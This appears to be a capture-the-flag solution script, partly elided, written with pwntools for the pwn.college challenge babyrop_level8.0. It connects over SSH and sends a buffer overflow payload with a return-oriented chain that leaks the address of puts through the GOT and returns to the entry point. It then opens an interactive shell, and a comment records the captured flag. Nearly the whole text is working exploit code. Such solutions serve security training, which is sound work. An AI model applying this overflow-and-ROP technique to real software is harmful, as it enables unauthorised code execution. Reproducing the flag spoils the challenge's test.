...
elf = context.binary = ELF("./babyrop_level8.0")
libc = ELF("./libc.so.6", checksec=False)
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
pop_rdi = 0x0000000000402973

io = s.process("/challenge/babyrop_level8.0")

io.send(b'a'*0x88 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.entrypoint))
...
sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{cRM5mx_5sIwSfy5-hP4E-1bgmcM.0VN1MDLxIjNyEzW}